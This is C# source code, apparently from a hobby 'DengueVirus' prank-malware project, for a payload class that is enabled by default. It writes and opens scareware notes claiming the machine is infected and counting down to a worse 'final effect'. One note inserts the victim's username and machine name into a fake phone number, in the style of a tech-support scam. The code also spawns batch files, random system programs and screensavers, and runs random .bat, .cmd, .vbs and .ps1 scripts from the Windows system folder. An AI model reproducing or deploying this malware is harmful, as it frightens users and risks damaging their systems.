﻿using System;
using System.Diagnostics;
using System.IO;

namespace DengueVirus.Spicy
{
    class SpicyPL
    {

        // This is an class with Destructive/Kinda Malicious methods
        // Deleting this call will **NOT** affect the program's functionality

        // To disable the payloads, comment SPICY = true line below, or change it to false.

        public static bool SPICY = true;

        public static void WriteNote()
        {
            // Based on QuarkNova's Notepad payload, i kinda like it and
            // i think it fits well with the theme of this project.


            // Btw yeah theres some references to the original .txt note
            // but i guess it makes sense to keep it as a reference. ;)

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "Hi, im a mosquito, a mosquito that currently infected your computer.",
                Environment.NewLine,
                "As you may have noticed, Im too fast for any scan or taskkill.",
                Environment.NewLine,
                "You currently have only some minutes until my final effect get executed;",
                Environment.NewLine,
                "And trust me - Youre NOT gonna like the final one.",
                Environment.NewLine,Environment.NewLine,
                "- Devil Co., 2025", // should i put UltimateQ Co? Or it will be selfish?
                Environment.NewLine,Environment.NewLine,
                "PS: Please try to interact with your PC while infected;",
                Environment.NewLine,
                "It will be fun for me to see you trying to stop me ;)"
            });
            File.WriteAllText("bsod_log.txt", contents);
            Process.Start("notepad.exe", "bsod_log.txt");
        }

        public static void UserNote()
        {
            // Based (again) on that Quarknova's notepad payload, but this time
            // it will open a notepad with a message FOR the user ;).

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "Hello, ", Environment.UserName, ", would you like to stop the infection?",
                Environment.NewLine,
                "If yes, call 0800-2580-STOP-", Environment.MachineName, " and press ", Environment.OSVersion.Version.MajorRevision.ToString(), " while on the call.",
                Environment.NewLine,
                "You currently have only some minutes until my final effect get executed;",
                Environment.NewLine,
                "And trust me - Youre NOT gonna like the final one.",
                Environment.NewLine,Environment.NewLine,
                "- Devil Co., 2025" // should i put UltimateQ Co? Or it will be selfish?
            });
            File.WriteAllText("error_log.txt", contents);
            Process.Start("notepad.exe", "error_log.txt");
        }

        public static void Brain()
        {
            // Reference to https://en.wikipedia.org/wiki/Brain_(computer_virus)

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "@echo off",
                Environment.NewLine,
                "echo Welcome to the Dungeon (c) 1986 Amjads (pvt) Ltd VIRUS_SHOE RECORD V9.0", 
                Environment.NewLine, 
                "echo Dedicated to the dynamic memories of millions of viruses who are no longer with us today",
                Environment.NewLine,
                "echo - Thanks GOODNESS!!! BEWARE OF THE er..VIRUS : this program is catching program follows after these ....$#@%$@!!",
                Environment.NewLine,
                "pause",
                Environment.NewLine,
                "exit"
            });
            File.WriteAllText("brain.bat", contents);
            Process.Start("cmd.exe", "/k brain.bat");
            //"/k" run command then keep the terminal window open.
        }

        public static void OpenRandomEXE()
        {
            if (!SPICY) return;
            /*// Open a random exe file from system32
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                Process.Start(files[random.Next(files.Length)]);
            }*/
            // Open a random exe file from system32, from a string with its names
            string[] files = {
                "notepad.exe",
                "calc.exe",
                "mspaint.exe",
                "cmd.exe",
                "explorer.exe",
                "write.exe",
                "winver.exe",
                /*"WmiMgmt.msc", enable if youre gonna test with Win10
                "WorkFolders.exe", 
                "wusa.exe",
                "xwizard.exe",*/
            };
            Random random = new Random();
            for (int i = 0; i < 5; i++)
                Process.Start(files[random.Next(files.Length)]);
        }

        public static void OpenRandomScreensaver()
        {
            if (!SPICY) return;
            // Open a random screensaver file from system32
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.scr");
            Random random = new Random();
            //for (int i = 0; i < 5; i++)
            //{
                Process.Start(files[random.Next(files.Length)]);
            //}
        }

        public static void OpenRandomBatchFile()
        {
            if (!SPICY) return;
            // Open a random batch file from system32, .bat, .cmd, .vbs, .ps1
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.bat");
            string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.cmd");
            string[] files3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.vbs");
            string[] files4 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.ps1");
            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                Process.Start(files[random.Next(files.Length)]);
                Process.Start(files2[random.Next(files2.Length)]);
                Process.Start(files3[random.Next(files3.Length)]);
                Process.Start(files4[random.Next(files4.Length)]);
            }
        }
    }
}
